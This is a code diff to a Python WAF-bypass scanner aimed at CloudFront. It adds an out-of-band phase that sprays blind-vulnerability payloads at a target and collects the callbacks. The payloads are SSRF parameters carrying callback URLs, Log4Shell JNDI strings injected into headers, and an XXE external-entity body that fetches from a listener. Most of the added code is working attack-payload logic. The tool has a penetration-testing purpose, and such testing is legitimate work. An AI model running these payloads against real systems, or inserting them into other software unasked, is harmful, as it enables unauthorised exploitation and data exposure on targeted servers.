@@ -965,7 +965,7 @@ class CloudFrontBypasser:
     _session_pool: Dict[str, requests.Session] = {}
     _session_lock = threading.Lock()
     
-    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5, proxy_config: dict = None, enable_http_logging: bool = False, enable_ssl_analysis: bool = False, enable_crawl: bool = True, enable_schema: bool = True, custom_payloads: dict = None, plugins: list = None, evasion_profile: dict = None, auth: dict = None):
+    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5, proxy_config: dict = None, enable_http_logging: bool = False, enable_ssl_analysis: bool = False, enable_crawl: bool = True, enable_schema: bool = True, custom_payloads: dict = None, plugins: list = None, evasion_profile: dict = None, auth: dict = None, oob=None):
         """
         Initialize CloudFront WAF Bypasser
 
@@ -1052,6 +1052,15 @@ class CloudFrontBypasser:
         # transient jitter. Toggleable by the CLI/GUI.
         self.reconfirm = True
         self.reconfirm_samples = 2
+
+        # Out-of-band confirmation engine (opt-in). When set, blind-vuln payloads
+        # embed callbacks to this provider and confirmed interactions become
+        # CRITICAL findings with proof. None -> OOB phase is a no-op.
+        self.oob = oob
+        self.oob_wait = 8               # min seconds to wait for callbacks
+        self._oob_fired: Dict[str, Tuple[str, str]] = {}
+        self._oob_spray_time: float = 0.0
+        self._oob_seen: Set[str] = set()
         
         # Response cache to avoid duplicate requests
         self._response_cache: Dict[str, Dict] = {}
@@ -1358,6 +1367,14 @@ class CloudFrontBypasser:
             except Exception as e:
                 logger.debug(f"Discovery phase error: {e}")
 
+        # OOB: spray blind-vuln callbacks early so the rest of the scan serves as
+        # the wait window; interactions are collected after the techniques run.
+        if self.oob:
+            try:
+                self._oob_spray()
+            except Exception as e:
+                logger.debug(f"OOB spray error: {e}")
+
         print("\n[*] Phase 3: Testing bypass techniques...")
         
         # Build technique list based on selected categories
@@ -1558,6 +1575,19 @@ class CloudFrontBypasser:
             logger.warning(f"Scan completed with {error_count} technique errors")
             print(f"\n[!] Warning: {error_count} techniques encountered errors")
 
+        # Collect any out-of-band callbacks triggered during the scan; confirmed
+        # interactions are proof-carrying CRITICAL findings.
+        if self.oob:
+            try:
+                self.results.extend(self._oob_collect())
+            except Exception as e:
+                logger.debug(f"OOB collect error: {e}")
+            finally:
+                try:
+                    self.oob.close()
+                except Exception:
+                    pass
+
         # Re-confirm flagged bypasses before reporting so transient flukes get
         # demoted rather than shipped as findings.
         if self.reconfirm:
@@ -1627,6 +1657,123 @@ class CloudFrontBypasser:
             print(f"[+] Re-confirmation demoted {demoted} unstable finding(s) to low confidence")
         else:
             print("[+] All candidate bypasses re-confirmed")
+
+    # ------------------------------------------------------------------ #
+    # Out-of-band confirmation
+    # ------------------------------------------------------------------ #
+    def _oob_spray(self) -> None:
+        """Fire blind-vuln payloads that make the TARGET call back to our OOB
+        server. Each payload embeds a uniquely-correlated callback so a received
+        interaction can be attributed to the exact vector. Runs early so the rest
+        of the scan doubles as the wait window; results are gathered later by
+        :meth:`_oob_collect`.
+        """
+        if not self.oob:
+            return
+        print("\n[*] OOB phase: spraying blind-vuln callbacks (SSRF / Log4Shell / XXE)...")
+        self._oob_spray_time = time.time()
+
+        def mint(label: str):
+            try:
+                return self.oob.register(label=label)
+            except Exception as e:
+                logger.debug(f"OOB register failed: {e}")
+                return None
+
+        # 1) SSRF via common request parameters on discovered endpoints + root.
+        ssrf_params = ['url', 'uri', 'next', 'dest', 'redirect', 'target', 'u',
+                       'link', 'callback', 'feed', 'host', 'site', 'path',
+                       'continue', 'image', 'imageurl', 'domain', 'out']
+        targets = self._injection_targets() or [{'path': '/', 'params': {}}]
+        for t in targets[:5]:
+            path = t.get('path', '/')
+            for p in ssrf_params[:8]:
+                h = mint('ssrf')
+                if not h:
+                    continue
+                sep = '&' if '?' in path else '?'
+                probe = f"{path}{sep}{p}={quote(h.http_url, safe='')}"
+                self._oob_fired[h.token] = ('SSRF', f"param '{p}' on {path}")
+                self._test_request(path=probe, technique=f"OOB-SSRF {p}", use_cache=False)
+
+        # 2) Log4Shell / JNDI in headers commonly logged by backends.
+        jndi_headers = ['User-Agent', 'Referer', 'X-Api-Version', 'X-Forwarded-For',
+                        'X-Forwarded-Host', 'True-Client-IP', 'X-Waf-Test']
+        for hdr in jndi_headers:
+            h = mint('log4shell')
+            if not h:
+                continue
+            payload = f"${{jndi:ldap://{h.domain}/a}}"
+            self._oob_fired[h.token] = ('Log4Shell/JNDI', f"'{hdr}' header")
+            self._test_request(headers={hdr: payload},
+                               technique=f"OOB-Log4Shell {hdr}", use_cache=False)
+
+        # 3) Blind XXE: external entity fetched over HTTP from our listener.
+        h = mint('xxe')
+        if h:
+            xxe = ('<?xml version="1.0"?>'
+                   f'<!DOCTYPE r [<!ENTITY x SYSTEM "{h.http_url}/xxe">]><r>&x;</r>')
+            self._oob_fired[h.token] = ('Blind XXE', 'XML body external entity')
+            self._test_request(method='POST',
+                               headers={'Content-Type': 'application/xml'},
+                               data=xxe, technique='OOB-XXE', use_cache=False)
+
+        print(f"  [*] Sprayed {len(self._oob_fired)} correlated OOB payload(s)")
+
+    def _oob_collect(self) -> List[Dict[str, Any]]:
+        """Poll the OOB provider and turn received interactions into CONFIRMED,
+        proof-carrying CRITICAL findings. Ensures at least ``oob_wait`` seconds
+        have elapsed since the spray so slow callbacks aren't missed."""
+        if not self.oob:
+            return []
+        elapsed = time.time() - self._oob_spray_time
+        remaining = self.oob_wait - elapsed
+        if remaining > 0:
+            print(f"[*] OOB: waiting {remaining:.0f}s more for callbacks...")
+            time.sleep(remaining)
+
+        try:
+            interactions = self.oob.poll()
+        except Exception as e:
+            logger.debug(f"OOB poll error: {e}")
+            interactions = []
+
+        results: List[Dict[str, Any]] = []
+        for ix in interactions:
+            # De-dup repeated callbacks for the same token/protocol.
+            dedup = f"{ix.token}:{ix.protocol}"
+            if dedup in self._oob_seen:
+                continue
+            self._oob_seen.add(dedup)
+            vector, where = self._oob_fired.get(ix.token, (None, None))
+            if vector is None:
+                if ix.token is not None:
+                    continue  # belongs to a different correlation id
+                vector, where = ('OOB callback', 'unattributed')
+            results.append({
+                'bypass': True, 'status': 0, 'headers': {}, 'method': 'OOB',
+                'path': '/', 'size': 0,
+                'technique': f"OOB-CONFIRMED {vector}",
+                'reason': (f"Out-of-band {ix.protocol.upper()} callback from target "
+                           f"({where}); source={ix.source or '?'}"),
+                'severity': 'CRITICAL', 'category': 'OOB',
+                'confidence': 'high', 'confirmations': 'oob', '_no_reconfirm': True,
+                'oob': {'protocol': ix.protocol, 'source': ix.source,
+                        'raw': ix.raw, 'timestamp': ix.timestamp, 'full_id': ix.full_id},
+            })
+            print(f"  [✓] OOB CONFIRMED: {vector} via {ix.protocol} from {ix.source or '?'}")
+        if not results:
+            print("  [-] No OOB callbacks received (no blind vuln confirmed, or callbacks delayed)")
+        return results
+
+    def _test_oob_interactions(self) -> List[Dict[str, Any]]:
+        """Synchronous OOB confirmation (spray + wait + collect) usable as a
+        standalone technique. The scan() flow prefers the split
+        spray-early / collect-late path for a free wait window."""
+        if not self.oob:
+            return []
+        self._oob_spray()
+        return self._oob_collect()
 
     def _attach_repro_commands(self) -> None:
         """Ensure every finding carries a copy-paste ``curl`` reproduction.
@@ -9735,6 +9882,16 @@ def main():
     parser.add_argument('--ai-report', help='Write an AI-generated markdown report to this path (needs ANTHROPIC_API_KEY)')
     parser.add_argument('--ai-key', help='Anthropic API key (overrides ANTHROPIC_API_KEY env)')
     parser.add_argument('--ai-model', help='Anthropic model id (default: per-feature)')
+    # Out-of-band (OOB) blind-vuln confirmation (opt-in)
+    parser.add_argument('--oob', choices=['off', 'interactsh', 'selfhosted'], default='off',
+                       help='Enable out-of-band confirmation of blind vulns (default: off)')
+    parser.add_argument('--oob-server', help='Interactsh server (default: public oast.* rotation)')
+    parser.add_argument('--oob-token', help='Interactsh auth token (for a self-hosted Interactsh)')
+    parser.add_argument('--oob-domain', help='Self-hosted listener public domain (NS-delegated to you)')
+    parser.add_argument('--oob-public-host', help='Self-hosted listener public host[:port] for HTTP-only mode')
+    parser.add_argument('--oob-http-port', type=int, default=0, help='Self-hosted listener HTTP bind port (0=ephemeral)')
+    parser.add_argument('--oob-dns-port', type=int, help='Self-hosted listener DNS bind port (e.g. 53; needs privilege)')
+    parser.add_argument('--oob-wait', type=int, default=8, help='Min seconds to wait for OOB callbacks (default: 8)')
     # Monitoring
     parser.add_argument('--monitor', action='store_true', help='After scanning, diff against the previous scan of this target')
     parser.add_argument('--webhook', help='Webhook URL for monitoring alerts')
@@ -9795,6 +9952,25 @@ def main():
             login['success'] = args.login_success
         auth['login'] = login
 
+    # Build the OOB provider if requested (opt-in; callbacks may use third-party
+    # infrastructure when using public Interactsh servers).
+    oob_provider = None
+    if args.oob and args.oob != 'off':
+        try:
+            from .oob import build_oob
+            oob_provider = build_oob(
+                args.oob,
+                server=args.oob_server, token=args.oob_token,
+                public_domain=args.oob_domain, public_host=args.oob_public_host,
+                http_port=args.oob_http_port, dns_port=args.oob_dns_port,
+            )
+            if oob_provider:
+                print(f"[*] OOB confirmation enabled ({oob_provider.name})")
+            else:
+                print("[!] OOB provider could not start; continuing without it")
+        except Exception as e:
+            print(f"[!] OOB init failed: {e}")
+
     try:
         # Initialize scanner (pre-wired with DB custom payloads / plugins / evasion
         # profile unless explicitly disabled).
@@ -9803,10 +9979,11 @@ def main():
             use_db_extras=not args.no_db_extras,
             threads=args.threads, delay=args.delay, timeout=args.timeout,
             enable_crawl=not args.no_crawl, enable_schema=not args.no_schema,
-            auth=auth or None,
+            auth=auth or None, oob=oob_provider,
         )
         scanner.reconfirm = not args.no_reconfirm
         scanner.reconfirm_samples = max(1, args.reconfirm_samples)
+        scanner.oob_wait = max(0, args.oob_wait)
 
         # Run scan with selected categories
         results = scanner.scan(selected_categories)
